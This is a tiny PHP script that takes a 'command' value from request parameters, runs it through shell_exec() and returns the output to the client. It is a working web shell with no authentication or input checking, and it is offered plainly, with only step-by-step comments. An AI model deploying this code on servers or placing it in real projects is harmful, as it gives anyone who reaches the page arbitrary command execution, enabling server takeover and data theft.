<?php

// Get the command to be executed from the request parameters
$command = $_REQUEST['command'];

// Execute the command using the shell_exec() function
$output = shell_exec($command);

// Return the output of the command to the client
echo $output;